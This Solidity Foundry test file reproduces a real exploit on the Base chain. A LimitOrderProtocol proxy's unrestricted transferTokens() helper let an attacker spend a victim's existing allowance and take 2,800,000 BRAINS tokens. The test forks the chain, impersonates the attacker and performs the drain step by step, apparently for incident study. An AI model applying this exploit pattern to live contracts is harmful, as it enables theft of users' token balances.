// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2,800,000 BRAINS
// Attacker : 0xc2B2197ca4B2eE3b4EB61Fc59E6D592d04a2e26A
// Attack Contract : 0xfeCC81Ad11E2362CDb6C3df16FF49682fF229dE7
// Vulnerable Contract : 0xCe8D7Cd4DdB3Fd50bAae0Cc59DBfd786a7f0e44e
// Attack Tx : {link: https://basescan.org/tx/0xf16c30f57d6f47d68fe8ee6ed1986ed9c0d837b00750daef9c742c395b55d564}
//
// @Info
// Vulnerable Contract Code : {https://basescan.org/address/0xce8d7cd4ddb3fd50baae0cc59dbfd786a7f0e44e#code}
// Proxy Contract Code : {https://basescan.org/address/0xb5486f71c902fe0844bb07221fa8f47834d90b1b#code}
//
// @Analysis
// Twitter Guy : {https://t.me/defimon_alerts/447}
//
// The LimitOrderProtocol proxy pointed to an implementation with an unrestricted
// transferTokens() helper. The attacker used the victim's existing BRAINS allowance to
// move the victim's full BRAINS balance to the attacker.

address constant ATTACKER = 0xc2B2197ca4B2eE3b4EB61Fc59E6D592d04a2e26A;
address constant ATTACK_CONTRACT = 0xfeCC81Ad11E2362CDb6C3df16FF49682fF229dE7;
address constant LIMIT_ORDER_PROXY = 0xb5486f71C902fe0844Bb07221Fa8f47834d90B1b;
address constant VULNERABLE_IMPLEMENTATION = 0xCe8D7Cd4DdB3Fd50bAae0Cc59DBfd786a7f0e44e;
address constant VICTIM = 0xcaF77DeCE27195CEB627feb5b588109b91ae6579;
address constant BRAINS_TOKEN = 0xF25B7DD973e30Dcf219fbED7bD336b9ab5A05DD9;

interface ILimitOrderProtocol {
    function transferTokens(address token, address from, address to, uint256 amount) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    ILimitOrderProtocol private constant limitOrderProxy = ILimitOrderProtocol(LIMIT_ORDER_PROXY);
    IERC20 private constant brains = IERC20(BRAINS_TOKEN);

    function setUp() public {
        uint256 forkBlock = 26_231_299;
        vm.createSelectFork("base", forkBlock);

        fundingToken = BRAINS_TOKEN;
        attacker = ATTACKER;
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(LIMIT_ORDER_PROXY, "LimitOrderProtocol Proxy");
        vm.label(VULNERABLE_IMPLEMENTATION, "Vulnerable Implementation");
        vm.label(VICTIM, "Victim");
        vm.label(BRAINS_TOKEN, "BRAINS");
    }

    function testExploit() public balanceLog {
        uint256 victimBalance = brains.balanceOf(VICTIM);
        uint256 attackerBalanceBefore = brains.balanceOf(ATTACKER);
        uint256 allowanceBefore = brains.allowance(VICTIM, LIMIT_ORDER_PROXY);

        assertEq(victimBalance, 2_800_000 ether);
        assertEq(attackerBalanceBefore, 0);
        assertGe(allowanceBefore, victimBalance);

        // step 1: use the unrestricted helper to spend the victim's existing proxy allowance.
        vm.prank(ATTACKER);
        limitOrderProxy.transferTokens(BRAINS_TOKEN, VICTIM, ATTACKER, victimBalance);

        // step 2: prove the same asset movement shown by the attack receipt.
        assertEq(brains.balanceOf(VICTIM), 0);
        assertEq(brains.balanceOf(ATTACKER) - attackerBalanceBefore, victimBalance);
    }
}
